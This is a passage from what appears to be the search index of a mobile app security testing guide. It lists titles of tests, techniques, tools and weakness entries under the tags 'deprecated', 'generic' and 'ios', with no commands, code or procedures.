Debuggable Flag Enabled in the AndroidManifest with semgrep          </li> <li>            MASTG-DEMO-0041: Uses of LAContext.evaluatePolicy with r2          </li> <li>            MASTG-DEMO-0042: Runtime Use of LAContext.evaluatePolicy with Frida          </li> <li>            MASTG-DEMO-0043: Uses of kSecAccessControlUserPresence with r2          </li> <li>            MASTG-DEMO-0044: Runtime Use of kSecAccessControlUserPresence with Frida          </li> <li>            MASTG-DEMO-0045: Uses of kSecAccessControlBiometryCurrentSet with r2          </li> <li>            MASTG-DEMO-0046: Runtime Use of kSecAccessControlBiometryCurrentSet with Frida          </li> <li>            MASTG-DEMO-0047: Runtime Use of the Keychain Not Requiring User Presence with Frida          </li> <li>            MASTG-DEMO-0048: SSLSocket Connection to Wrong Host Server Allowed by Lack of HostnameVerifier          </li> <li>            MASTG-DEMO-0049: SSLSocket Connection to Wrong Host Server Blocked by HostnameVerifier          </li> <li>            MASTG-DEMO-0050: Identifying Insecure Dependencies in Android Studio          </li> <li>            MASTG-DEMO-0051: Identifying Insecure Dependencies through SBOM Creation          </li> <li>            MASTG-DEMO-0052: Scanning Package Manager Artifacts for Insecure iOS Dependencies          </li> <li>            MASTG-DEMO-0053: Identifying Insecure Dependencies in SwiftPM through SBOM creation          </li> <li>            MASTG-DEMO-0054: Use of a TrustManager that Does Not Validate Certificate Chains          </li> <li>            MASTG-DEMO-0055: Use of the HostnameVerifier that Allows Any Hostname          </li> <li>            MASTG-DEMO-0056: WebView Ignoring TLS Errors in onReceivedSslError          </li> <li>            MASTG-DEMO-0057: Network Security Configuration Allows User-Added Certificates          </li> <li>            MASTG-DEMO-0060: App Writing Sensitive Data to Sandbox using EncryptedSharedPreferences          </li> </ul>","tags":[]},{"location":"tags/#tag:deprecated","title":"deprecated","text":"<ul> <li>            MASTG-KNOW-0002: FingerprintManager          </li> <li>            MASTG-KNOW-0046: BouncyCastle KeyStore          </li> <li>            MASTG-TEST-0001: Testing Local Storage for Sensitive Data          </li> <li>            MASTG-TEST-0003: Testing Logs for Sensitive Data          </li> <li>            MASTG-TEST-0006: Determining Whether the Keyboard Cache Is Disabled for Text Input Fields          </li> <li>            MASTG-TEST-0009: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0012: Testing the Device-Access-Security Policy          </li> <li>            MASTG-TEST-0013: Testing Symmetric Cryptography          </li> <li>            MASTG-TEST-0016: Testing Random Number Generation          </li> <li>            MASTG-TEST-0019: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0020: Testing the TLS Settings          </li> <li>            MASTG-TEST-0021: Testing Endpoint Identify Verification          </li> <li>            MASTG-TEST-0022: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0024: Testing for App Permissions          </li> <li>            MASTG-TEST-0031: Testing JavaScript Execution in WebViews          </li> <li>            MASTG-TEST-0032: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0038: Making Sure that the App is Properly Signed          </li> <li>            MASTG-TEST-0039: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0041: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0042: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0044: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0054: Determining Whether Sensitive Data Is Shared with Third Parties          </li> <li>            MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0062: Testing Key Management          </li> <li>            MASTG-TEST-0064: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0073: Testing UIPasteboard          </li> <li>            MASTG-TEST-0081: Making Sure that the App Is Properly Signed          </li> <li>            MASTG-TEST-0082: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0083: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0085: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0087: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0088: Testing Jailbreak Detection          </li> <li>            MASTG-TOOL-0023: RootCloak Plus          </li> <li>            MASTG-TOOL-0046: Cycript          </li> <li>            MASTG-TOOL-0047: Cydia          </li> <li>            MASWE-0013: Hardcoded Cryptographic Keys in Use          </li> <li>            MASWE-0034: Insecure Implementation of Confirm Credentials          </li> </ul>","tags":[]},{"location":"tags/#tag:generic","title":"generic","text":"<ul> <li>            MASTG-TECH-0047: Reverse Engineering          </li> <li>            MASTG-TECH-0048: Static Analysis          </li> <li>            MASTG-TECH-0049: Dynamic Analysis          </li> <li>            MASTG-TECH-0050: Binary Analysis          </li> <li>            MASTG-TECH-0051: Tampering and Runtime Instrumentation          </li> <li>            MASTG-TECH-0119: Intercepting HTTP Traffic by Hooking Network APIs at the Application Layer          </li> <li>            MASTG-TECH-0120: Intercepting HTTP Traffic Using an Interception Proxy          </li> <li>            MASTG-TECH-0121: Intercepting Non-HTTP Traffic Using an Interception Proxy          </li> <li>            MASTG-TECH-0122: Passive Eavesdropping          </li> <li>            MASTG-TECH-0123: Achieving a MITM Position via ARP Spoofing          </li> <li>            MASTG-TECH-0124: Achieving a MITM Position Using a Rogue Access Point          </li> <li>            MASTG-TECH-0125: Intercepting Xamarin Traffic          </li> <li>            MASTG-TOOL-0031: Frida          </li> <li>            MASTG-TOOL-0032: Frida CodeShare          </li> <li>            MASTG-TOOL-0033: Ghidra          </li> <li>            MASTG-TOOL-0034: LIEF          </li> <li>            MASTG-TOOL-0035: MobSF          </li> <li>            MASTG-TOOL-0036: r2frida          </li> <li>            MASTG-TOOL-0037: RMS Runtime Mobile Security          </li> <li>            MASTG-TOOL-0038: objection          </li> <li>            MASTG-TOOL-0098: iaito          </li> <li>            MASTG-TOOL-0100: reFlutter          </li> <li>            MASTG-TOOL-0101: disable-flutter-tls-verification          </li> <li>            MASTG-TOOL-0104: hermes-dec          </li> <li>            MASTG-TOOL-0106: Fridump          </li> <li>            MASTG-TOOL-0108: Corellium          </li> <li>            MASTG-TOOL-0110: semgrep          </li> <li>            MASTG-TOOL-0129: rabin2          </li> <li>            MASTG-TOOL-0131: dependency-check          </li> <li>            MASTG-TOOL-0132: dependency-track          </li> <li>            MASTG-TOOL-0133: Visual Studio Code (vscode)          </li> <li>            MASTG-TOOL-0134: cdxgen          </li> </ul>","tags":[]},{"location":"tags/#tag:ios","title":"ios","text":"<ul> <li>            MASTG-APP-0023: DVIA          </li> <li>            MASTG-APP-0024: DVIA-v2          </li> <li>            MASTG-APP-0025: iOS UnCrackable L1          </li> <li>            MASTG-APP-0026: iOS UnCrackable L2          </li> <li>            MASTG-APP-0027: Disable-flutter-tls-verification          </li> <li>            MASTG-APP-0028: iGoat-Swift          </li> <li>            MASTG-DEMO-0011: Uses of Insufficient Key Size in SecKeyCreateRandomKey with r2          </li> <li>            MASTG-DEMO-0013: Use of Hardcoded RSA Private Key in SecKeyCreateWithData with r2          </li> <li>            MASTG-DEMO-0014: Use of Hardcoded ECDSA Private Key in CryptoKit with r2          </li> <li>            MASTG-DEMO-0015: Uses of Broken Hashing Algorithms in CommonCrypto with r2          </li> <li>            MASTG-DEMO-0016: Uses of Broken Hashing Algorithms in CryptoKit with r2          </li> <li>            MASTG-DEMO-0018: Uses of Broken Encryption Algorithms in CommonCrypto with r2          </li> <li>            MASTG-DEMO-0019: Uses of isExcludedFromBackupKey with r2          </li> <li>            MASTG-DEMO-0021: Uses of Jailbreak Detection Techniques with r2          </li> <li>            MASTG-DEMO-0024: Uses of LAContext.canEvaluatePolicy with r2          </li> <li>            MASTG-DEMO-0026: Runtime Use of LAContext.canEvaluatePolicy with Frida          </li> <li>            MASTG-DEMO-0036: Debuggable Entitlement Enabled in the entitlements.plist with rabin2          </li> <li>            MASTG-DEMO-0041: Uses of LAContext.evaluatePolicy with r2          </li> <li>            MASTG-DEMO-0042: Runtime Use of LAContext.evaluatePolicy with Frida          </li> <li>            MASTG-DEMO-0043: Uses of kSecAccessControlUserPresence with r2          </li> <li>            MASTG-DEMO-0044: Runtime Use of kSecAccessControlUserPresence with Frida          </li> <li>            MASTG-DEMO-0045: Uses of kSecAccessControlBiometryCurrentSet with r2          </li> <li>            MASTG-DEMO-0046: Runtime Use of kSecAccessControlBiometryCurrentSet with Frida          </li> <li>            MASTG-DEMO-0047: Runtime Use of the Keychain Not Requiring User Presence with Frida          </li> <li>            MASTG-DEMO-0052: Scanning Package Manager Artifacts for Insecure iOS Dependencies          </li> <li>            MASTG-DEMO-0053: Identifying Insecure Dependencies in SwiftPM through SBOM creation          </li> <li>            MASTG-KNOW-0056: Local Authentication Framework          </li> <li>            MASTG-KNOW-0057: Keychain Services          </li> <li>            MASTG-KNOW-0058: App Signing          </li> <li>            MASTG-KNOW-0059: Third-Party Libraries          </li> <li>            MASTG-KNOW-0060: Memory Corruption Bugs          </li> <li>            MASTG-KNOW-0061: Binary Protection Mechanisms          </li> <li>            MASTG-KNOW-0062: Debuggable Apps          </li> <li>            MASTG-KNOW-0063: Debugging Symbols          </li> <li>            MASTG-KNOW-0064: Debugging Code and Error Logging          </li> <li>            MASTG-KNOW-0065: Exception Handling          </li> <li>            MASTG-KNOW-0066: CryptoKit          </li> <li>            MASTG-KNOW-0067: CommonCrypto, SecKey and Wrapper libraries          </li> <li>            MASTG-KNOW-0068: Cryptographic Third-Party libraries          </li> <li>            MASTG-KNOW-0069: Key Management          </li> <li>            MASTG-KNOW-0070: Random Number Generator          </li> <li>            MASTG-KNOW-0071: iOS App Transport Security          </li> <li>            MASTG-KNOW-0072: Server Trust Evaluation          </li> <li>            MASTG-KNOW-0073: iOS Network APIs          </li> <li>            MASTG-KNOW-0074: Enforced Updating          </li> <li>            MASTG-KNOW-0075: Object Serialization          </li> <li>            MASTG-KNOW-0076: WebViews          </li> <li>            MASTG-KNOW-0077: App Permissions          </li> <li>            MASTG-KNOW-0078: Inter-Process Communication (IPC)          </li> <li>            MASTG-KNOW-0079: Custom URL Schemes          </li> <li>            MASTG-KNOW-0080: Universal Links          </li> <li>            MASTG-KNOW-0081: UIActivity Sharing          </li> <li>            MASTG-KNOW-0082: App extensions          </li> <li>            MASTG-KNOW-0083: Pasteboard          </li> <li>            MASTG-KNOW-0084: Jailbreak Detection          </li> <li>            MASTG-KNOW-0085: Anti-Debugging Detection          </li> <li>            MASTG-KNOW-0086: File Integrity Checks          </li> <li>            MASTG-KNOW-0087: Reverse Engineering Tools Detection          </li> <li>            MASTG-KNOW-0088: Emulator Detection          </li> <li>            MASTG-KNOW-0089: Obfuscation          </li> <li>            MASTG-KNOW-0090: Device Binding          </li> <li>            MASTG-KNOW-0091: File System APIs          </li> <li>            MASTG-KNOW-0092: Binary Data Storage          </li> <li>            MASTG-KNOW-0093: UserDefaults          </li> <li>            MASTG-KNOW-0094: CoreData          </li> <li>            MASTG-KNOW-0095: Firebase Real-time Databases          </li> <li>            MASTG-KNOW-0096: Realm Databases          </li> <li>            MASTG-KNOW-0097: Other Third-Party Databases          </li> <li>            MASTG-KNOW-0098: User Interface Components          </li> <li>            MASTG-KNOW-0099: Screenshots          </li> <li>            MASTG-KNOW-0100: Keyboard Cache          </li> <li>            MASTG-KNOW-0101: Logs          </li> <li>            MASTG-KNOW-0102: Backups          </li> <li>            MASTG-KNOW-0103: Process Memory          </li> <li>            MASTG-KNOW-0104: Inter-Process Communication (IPC) Mechanisms          </li> <li>            MASTG-TECH-0052: Accessing the Device Shell          </li> <li>            MASTG-TECH-0053: Host-Device Data Transfer          </li> <li>            MASTG-TECH-0054: Obtaining and Extracting Apps          </li> <li>            MASTG-TECH-0055: Launching a Repackaged App in Debug Mode          </li> <li>            MASTG-TECH-0056: Installing Apps          </li> <li>            MASTG-TECH-0057: Listing Installed Apps          </li> <li>            MASTG-TECH-0058: Exploring the App Package          </li> <li>            MASTG-TECH-0059: Accessing App Data Directories          </li> <li>            MASTG-TECH-0060: Monitoring System Logs          </li> <li>            MASTG-TECH-0061: Dumping KeyChain Data          </li> <li>            MASTG-TECH-0062: Basic Network Monitoring/Sniffing          </li> <li>            MASTG-TECH-0063: Setting up an Interception Proxy          </li> <li>            MASTG-TECH-0064: Bypassing Certificate Pinning          </li> <li>            MASTG-TECH-0065: Reverse Engineering iOS Apps          </li> <li>            MASTG-TECH-0066: Static Analysis on iOS          </li> <li>            MASTG-TECH-0067: Dynamic Analysis on iOS          </li> <li>            MASTG-TECH-0068: Disassembling Native Code          </li> <li>            MASTG-TECH-0069: Decompiling Native Code          </li> <li>            MASTG-TECH-0070: Extracting Information from the Application Binary          </li> <li>            MASTG-TECH-0071: Retrieving Strings          </li> <li>            MASTG-TECH-0072: Retrieving Cross References          </li> <li>            MASTG-TECH-0073: Information Gathering - API Usage          </li> <li>            MASTG-TECH-0074: Information Gathering - Network Communication          </li> <li>            MASTG-TECH-0075: Reviewing Decompiled Objective-C and Swift Code          </li> <li>            MASTG-TECH-0076: Reviewing Disassembled Objective-C and Swift Code          </li> <li>            MASTG-TECH-0077: Reviewing Disassembled Native Code          </li> <li>            MASTG-TECH-0078: Automated Static Analysis          </li> <li>            MASTG-TECH-0079: Obtaining a Developer Provisioning Profile          </li> <li>            MASTG-TECH-0080: Get Open Files          </li> <li>            MASTG-TECH-0081: Get Open Connections          </li> <li>            MASTG-TECH-0082: Get Shared Libraries          </li> <li>            MASTG-TECH-0083: Sandbox Inspection          </li> <li>            MASTG-TECH-0084: Debugging          </li> <li>            MASTG-TECH-0085: Execution Tracing          </li> <li>            MASTG-TECH-0086: Method Tracing          </li> <li>            MASTG-TECH-0087: Native Code Tracing          </li> <li>            MASTG-TECH-0088: Emulation-based Analysis          </li> <li>            MASTG-TECH-0089: Symbolic Execution          </li> <li>            MASTG-TECH-0090: Injecting Frida Gadget into an IPA Automatically          </li> <li>            MASTG-TECH-0091: Injecting Libraries into an IPA Manually          </li> <li>            MASTG-TECH-0092: Signing IPA files          </li> <li>            MASTG-TECH-0093: Waiting for the debugger          </li> <li>            MASTG-TECH-0094: Getting Loaded Classes and Methods dynamically          </li> <li>            MASTG-TECH-0095: Method Hooking          </li> <li>            MASTG-TECH-0096: Process Exploration          </li> <li>            MASTG-TECH-0097: Runtime Reverse Engineering          </li> <li>            MASTG-TECH-0098: Patching React Native Apps          </li> <li>            MASTG-TECH-0110: Intercepting Flutter HTTPS Traffic          </li> <li>            MASTG-TECH-0111: Extracting Entitlements from MachO Binaries          </li> <li>            MASTG-TECH-0112: Obtaining the Code Signature Format Version          </li> <li>            MASTG-TECH-0113: Obtaining Debugging Symbols          </li> <li>            MASTG-TECH-0114: Demangling Symbols          </li> <li>            MASTG-TECH-0118: Obtaining Compiler-Provided Security Features          </li> <li>            MASTG-TECH-0132: Software Composition Analysis (SCA) of iOS Dependencies by Creating a SBOM          </li> <li>            MASTG-TECH-0133: Software Composition Analysis (SCA) of iOS Dependencies by Scanning Package Manager Artifacts          </li> <li>            MASTG-TECH-0134: Monitoring the Pasteboard          </li> <li>            MASTG-TECH-0135: Bypassing Biometric Authentication          </li> <li>            MASTG-TECH-0136: Retrieving PrivacyInfo.xcprivacy Files          </li> <li>            MASTG-TECH-0137: Analyzing PrivacyInfo.xcprivacy Files          </li> <li>            MASTG-TECH-0138: Convert Plist Files to JSON          </li> <li>            MASTG-TEST-0052: Testing Local Data Storage          </li> <li>            MASTG-TEST-0053: Checking Logs for Sensitive Data          </li> <li>            MASTG-TEST-0054: Determining Whether Sensitive Data Is Shared with Third Parties          </li> <li>            MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache          </li> <li>            MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0057: Checking for Sensitive Data Disclosed Through the User Interface          </li> <li>            MASTG-TEST-0058: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0059: Testing Auto-Generated Screenshots for Sensitive Information          </li> <li>            MASTG-TEST-0060: Testing Memory for Sensitive Data          </li> <li>            MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0062: Testing Key Management          </li> <li>            MASTG-TEST-0063: Testing Random Number Generation          </li> <li>            MASTG-TEST-0064: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0065: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0066: Testing the TLS Settings          </li> <li>            MASTG-TEST-0067: Testing Endpoint Identity Verification          </li> <li>            MASTG-TEST-0068: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0069: Testing App Permissions          </li> <li>            MASTG-TEST-0070: Testing Universal Links          </li> <li>            MASTG-TEST-0071: Testing UIActivity Sharing          </li> <li>            MASTG-TEST-0072: Testing App Extensions          </li> <li>            MASTG-TEST-0073: Testing UIPasteboard          </li> <li>            MASTG-TEST-0075: Testing Custom URL Schemes          </li> <li>            MASTG-TEST-0076: Testing iOS WebViews          </li> <li>            MASTG-TEST-0077: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews          </li> <li>            MASTG-TEST-0079: Testing Object Persistence          </li> <li>            MASTG-TEST-0080: Testing Enforced Updating          </li> <li>            MASTG-TEST-0081: Making Sure that the App Is Properly Signed          </li> <li>            MASTG-TEST-0082: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0083: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0084: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0085: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0086: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0087: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0088: Testing Jailbreak Detection          </li> <li>            MASTG-TEST-0089: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0090: Testing File Integrity Checks          </li> <li>            MASTG-TEST-0091: Testing Reverse Engineering Tools Detection          </li> <li>            MASTG-TEST-0092: Testing Emulator Detection          </li> <li>            MASTG-TEST-0093: Testing Obfuscation          </li> <li>            MASTG-TEST-0209: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0210: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0211: Broken Hashing Algorithms          </li> <li>            MASTG-TEST-0213: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0214: Hardcoded Cryptographic Keys in Files          </li> <li>            MASTG-TEST-0215: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0219: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0220: Usage of Outdated Code Signature Format          </li> <li>            MASTG-TEST-0228: Position Independent Code (PIC) not Enabled          </li> <li>            MASTG-TEST-0229: Stack Canaries Not enabled          </li> <li>            MASTG-TEST-0230: Automatic Reference Counting (ARC) not enabled          </li> <li>            MASTG-TEST-0240: Jailbreak Detection in Code          </li> <li>            MASTG-TEST-0241: Runtime Use of Jailbreak Detection Techniques          </li> <li>            MASTG-TEST-0246: Runtime Use of Secure Screen Lock Detection APIs          </li> <li>            MASTG-TEST-0248: References to APIs for Detecting Secure Screen Lock          </li> <li>            MASTG-TEST-0261: Debuggable Entitlement Enabled in the entitlements.plist          </li> <li>            MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication          </li> <li>            MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication          </li> <li>            MASTG-TEST-0268: References to APIs Allowing Fallback to Non-Biometric Authentication          </li> <li>            MASTG-TEST-0269: Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication          </li> <li>            MASTG-TEST-0270: References to APIs Detecting Biometric Enrollment Changes          </li> <li>            MASTG-TEST-0271: Runtime Use Of APIs Detecting Biometric Enrollment Changes          </li> <li>            MASTG-TEST-0273: Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts          </li> <li>            MASTG-TEST-0275: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0276: Use of the iOS General Pasteboard          </li> <li>            MASTG-TEST-0277: Sensitive Data in the iOS General Pasteboard at Runtime          </li> <li>            MASTG-TEST-0278: Pasteboard Contents Not Cleared After Use          </li> <li>            MASTG-TEST-0279: Pasteboard Contents Not Expiring          </li> <li>            MASTG-TEST-0280: Pasteboard Contents Not Restricted to Local Device          </li> <li>            MASTG-TEST-0281: Undeclared Known Tracking Domains          </li> <li>            MASTG-TOOL-0039: Frida for iOS          </li> <li>            MASTG-TOOL-0040: MobSF for iOS          </li> <li>            MASTG-TOOL-0041: nm - iOS          </li> <li>            MASTG-TOOL-0042: BinaryCookieReader          </li> <li>            MASTG-TOOL-0043: class-dump          </li> <li>            MASTG-TOOL-0044: class-dump-z          </li> <li>            MASTG-TOOL-0045: class-dump-dyld          </li> <li>            MASTG-TOOL-0046: Cycript          </li> <li>            MASTG-TOOL-0047: Cydia          </li> <li>            MASTG-TOOL-0048: dsdump          </li> <li>            MASTG-TOOL-0049: Frida-cycript          </li> <li>            MASTG-TOOL-0050: Frida-ios-dump          </li> <li>            MASTG-TOOL-0051: gdb          </li> <li>            MASTG-TOOL-0053: iOSbackup          </li> <li>            MASTG-TOOL-0054: ios-deploy          </li> <li>            MASTG-TOOL-0055: iproxy          </li> <li>            MASTG-TOOL-0056: Keychain-Dumper          </li> <li>            MASTG-TOOL-0057: lldb          </li> <li>            MASTG-TOOL-0058: MachoOView          </li> <li>            MASTG-TOOL-0059: optool          </li> <li>            MASTG-TOOL-0060: otool          </li> <li>            MASTG-TOOL-0061: Grapefruit          </li> <li>            MASTG-TOOL-0062: Plutil          </li> <li>            MASTG-TOOL-0063: security          </li> <li>            MASTG-TOOL-0064: Sileo          </li> <li>            MASTG-TOOL-0065: simctl          </li> <li>            MASTG-TOOL-0066: SSL Kill Switch 3          </li> <li>            MASTG-TOOL-0067: swift-demangle          </li> <li>            MASTG-TOOL-0068: SwiftShield          </li> <li>            MASTG-TOOL-0069: Usbmuxd          </li> <li>            MASTG-TOOL-0070: Xcode          </li> <li>            MASTG-TOOL-0071: Xcode Command Line Tools          </li> <li>            MASTG-TOOL-0072: xcrun          </li> <li>            MASTG-TOOL-0073: radare2 for iOS          </li> <li>            MASTG-TOOL-0074: objection for iOS          </li> <li>            MASTG-TOOL-0102: ios-app-signer          </li> <li>            MASTG-TOOL-0105: ipsw          </li> <li>            MASTG-TOOL-0111: ldid          </li> <li>            MASTG-TOOL-0114: codesign          </li> <li>            MASTG-TOOL-0117: fastlane          </li> <li>            MASTG-TOOL-0118: Sideloadly          </li> <li>            MASTG-TOOL-0121: objdump - iOS          </li> <li>            MASTG-TOOL-0122: c++filt          </li> <li>            MASTG-TOOL-0126: libimobiledevice suite          </li> <li>            MASTG-TOOL-0127: AppSync Unified          </li> <li>            MASTG-TOOL-0128: Filza          </li> <li>            MASTG-TOOL-0135: PlistBuddy          </li> <li>            MASTG-TOOL-0136: plistlib          </li> <li>            MASTG-TOOL-0137: GlobalWebInspect          </li> <li>            MASTG-TOOL-0138: ipainstaller          </li> <li>            MASTG-TOOL-0139: ElleKit          </li> <li>            MASTG-TOOL-0141: IOSSecuritySuite          </li> <li>            MASTG-TOOL-0142: Choicy          </li> <li>            MASWE-0001: Insertion of Sensitive Data into Logs          </li> <li>            MASWE-0004: Sensitive Data Not Excluded From Backup          </li> <li>            MASWE-0005: API Keys Hardcoded in the App Package          </li> <li>            MASWE-0006: Sensitive Data Stored Unencrypted in Private Storage Locations          </li> <li>            MASWE-0008: Missing Device Secure Lock Verification Implementation          </li> <li>            MASWE-0009: Improper Cryptographic Key Generation          </li> <li>            MASWE-0010: Improper Cryptographic Key Derivation          </li> <li>            MASWE-0011: Cryptographic Key Rotation Not Implemented          </li> <li>            MASWE-0012: Insecure or Wrong Usage of Cryptographic Key          </li> <li>            MASWE-0013: Hardcoded Cryptographic Keys in Use          </li> <li>            MASWE-0014: Cryptographic Keys Not Properly Protected at Rest          </li> <li>            MASWE-0016: Unsafe Handling of Imported Cryptographic Keys          </li> <li>            MASWE-0017: Cryptographic Keys Not Properly Protected on Export          </li> <li>            MASWE-0018: Cryptographic Keys Access Not Restricted          </li> <li>            MASWE-0019: Risky Cryptography Implementations          </li> <li>            MASWE-0020: Improper Encryption          </li> <li>            MASWE-0021: Improper Hashing          </li> <li>            MASWE-0022: Predictable Initialization Vectors (IVs)          </li> <li>            MASWE-0023: Risky Padding          </li> <li>            MASWE-0024: Improper Use of Message Authentication Code (MAC)          </li> <li>            MASWE-0025: Improper Generation of Cryptographic Signatures          </li> <li>            MASWE-0026: Improper Verification of Cryptographic Signature          </li> <li>            MASWE-0027: Improper Random Number Generation          </li> <li>            MASWE-0028: MFA Implementation Best Practices Not Followed          </li> <li>            MASWE-0029: Step-Up Authentication Not Implemented After Login          </li> <li>            MASWE-0030: Re-Authenticates Not Triggered On Contextual State Changes          </li> <li>            MASWE-0032: Platform-provided Authentication APIs Not Used          </li> <li>            MASWE-0033: Authentication or Authorization Protocol Security Best Practices Not Followed          </li> <li>            MASWE-0035: Passwordless Authentication Not Implemented          </li> <li>            MASWE-0036: Authentication Material Stored Unencrypted on the Device          </li> <li>            MASWE-0037: Authentication Material Sent over Insecure Connections          </li> <li>            MASWE-0038: Authentication Tokens Not Validated          </li> <li>            MASWE-0039: Shared Web Credentials and Website-association Not Implemented          </li> <li>            MASWE-0040: Insecure Authentication in WebViews          </li> <li>            MASWE-0041: Authentication Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0042: Authorization Enforced Only Locally Instead of on the Server-side          </li> <li>            MASWE-0043: App Custom PIN Not Bound to Platform KeyStore          </li> <li>            MASWE-0044: Biometric Authentication Can Be Bypassed          </li> <li>            MASWE-0045: Fallback to Non-biometric Credentials Allowed for Sensitive Transactions          </li> <li>            MASWE-0046: Crypto Keys Not Invalidated on New Biometric Enrollment          </li> <li>            MASWE-0047: Insecure Identity Pinning          </li> <li>            MASWE-0048: Insecure Machine-to-Machine Communication          </li> <li>            MASWE-0049: Proven Networking APIs Not used          </li> <li>            MASWE-0050: Cleartext Traffic          </li> <li>            MASWE-0051: Unprotected Open Ports          </li> <li>            MASWE-0052: Insecure Certificate Validation          </li> <li>            MASWE-0053: Sensitive Data Leaked via the User Interface          </li> <li>            MASWE-0054: Sensitive Data Leaked via Notifications          </li> <li>            MASWE-0055: Sensitive Data Leaked via Screenshots          </li> <li>            MASWE-0056: Tapjacking Attacks          </li> <li>            MASWE-0058: Insecure Deep Links          </li> <li>            MASWE-0059: Use Of Unauthenticated Platform IPC          </li> <li>            MASWE-0060: Insecure Use of UIActivity          </li> <li>            MASWE-0061: Insecure Use of App Extensions          </li> <li>            MASWE-0067: Debuggable Flag Not Disabled          </li> <li>            MASWE-0068: JavaScript Bridges in WebViews          </li> <li>            MASWE-0069: WebViews Allows Access to Local Resources          </li> <li>            MASWE-0070: JavaScript Loaded from Untrusted Sources          </li> <li>            MASWE-0071: WebViews Loading Content from Untrusted Sources          </li> <li>            MASWE-0072: Universal XSS          </li> <li>            MASWE-0074: Web Content Debugging Enabled          </li> <li>            MASWE-0075: Enforced Updating Not Implemented          </li> <li>            MASWE-0076: Dependencies with Known Vulnerabilities          </li> <li>            MASWE-0077: Running on a recent Platform Version Not Ensured          </li> <li>            MASWE-0078: Latest Platform Version Not Targeted          </li> <li>            MASWE-0079: Unsafe Handling of Data from the Network          </li> <li>            MASWE-0080: Unsafe Handling of Data from Backups          </li> <li>            MASWE-0081: Unsafe Handling Of Data From External Interfaces          </li> <li>            MASWE-0082: Unsafe Handling of Data From Local Storage          </li> <li>            MASWE-0083: Unsafe Handling of Data From The User Interface          </li> <li>            MASWE-0084: Unsafe Handling of Data from IPC          </li> <li>            MASWE-0085: Unsafe Dynamic Code Loading          </li> <li>            MASWE-0086: SQL Injection          </li> <li>            MASWE-0087: Insecure Parsing and Escaping          </li> <li>            MASWE-0088: Insecure Object Deserialization          </li> <li>            MASWE-0089: Code Obfuscation Not Implemented          </li> <li>            MASWE-0090: Resource Obfuscation Not Implemented          </li> <li>            MASWE-0091: Anti-Deobfuscation Techniques Not Implemented          </li> <li>            MASWE-0092: Static Analysis Tools Not Prevented          </li> <li>            MASWE-0093: Debugging Symbols Not Removed          </li> <li>            MASWE-0094: Non-Production Resources Not Removed          </li> <li>            MASWE-0095: Code That Disables Security Controls Not Removed          </li> <li>            MASWE-0096: Data Sent Unencrypted Over Encrypted Connections          </li> <li>            MASWE-0097: Root/Jailbreak Detection Not Implemented          </li> <li>            MASWE-0098: App Virtualization Environment Detection Not Implemented          </li> <li>            MASWE-0099: Emulator Detection Not Implemented          </li> <li>            MASWE-0100: Device Attestation Not Implemented          </li> <li>            MASWE-0101: Debugger Detection Not Implemented          </li> <li>            MASWE-0102: Dynamic Analysis Tools Detection Not Implemented          </li> <li>            MASWE-0103: RASP Techniques Not Implemented          </li> <li>            MASWE-0104: App Integrity Not Verified          </li> <li>            MASWE-0105: Integrity of App Resources Not Verified          </li> <li>            MASWE-0106: Official Store Verification Not Implemented          </li> <li>            MASWE-0107: Runtime Code Integrity Not Verified          </li> <li>            MASWE-0108: Sensitive Data in Network Traffic          </li> <li>            MASWE-0109: Lack of Anonymization or Pseudonymisation Measures          </li> <li>            MASWE-0110: Use of Unique Identifiers for User Tracking          </li> <li>            MASWE-0111: Inadequate Privacy Policy          </li> <li>            MASWE-0112: Inadequate Data Collection Declarations          </li> <li>            MASWE-0113: Lack of Proper Data Management Controls          </li> <li>            MASWE-0114: Inadequate Data Visibility Controls          </li> <li>            MASWE-0115: Inadequate or Ambiguous User Consent Mechanisms          </li> <li>            MASWE-0116: Compiler Provided Security Features Not Used          </li> <li>            MASWE-0117: Inadequate Permission Management          </li> <li>            iOS Anti-Reversing Defenses          </li> <li>            iOS Code Quality and Build Settings          </li> <li>     